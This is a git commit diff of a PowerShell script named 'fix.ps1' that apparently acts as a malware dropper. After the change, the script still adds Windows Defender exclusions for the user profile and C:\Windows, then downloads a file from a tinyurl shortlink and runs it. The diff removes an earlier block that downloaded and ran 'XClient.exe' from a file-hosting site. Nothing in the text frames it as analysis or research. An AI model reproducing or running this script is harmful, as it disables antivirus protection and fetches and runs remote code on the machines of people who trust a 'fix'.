0d22a59484258bb40888813be5eb954aa920e4d2
hot90923 <hot90923@gmail.com>
2025-01-12 17:54:04 +0700

    Update fix.ps1

--- fix.ps1
+++ fix.ps1
@@ -1,15 +1,6 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
-
-$url = "https://www.upload.ee/download/17523163/d6565117de101fe7edd8/XClient.exe"
-$output = "$env:XClient.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-
-Start-Process -FilePath $output
-
-Add-MpPreference -ExclusionPath $env:USERPROFILE
-Add-MpPreference -ExclusionPath C:\Windows
-$url = "https://github.com/hot90923/123/raw/refs/heads/main/FixL.cmd"
+$url = "https://tinyurl.com/bdehddsv"
 $output = "$env:Fix.cmd"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
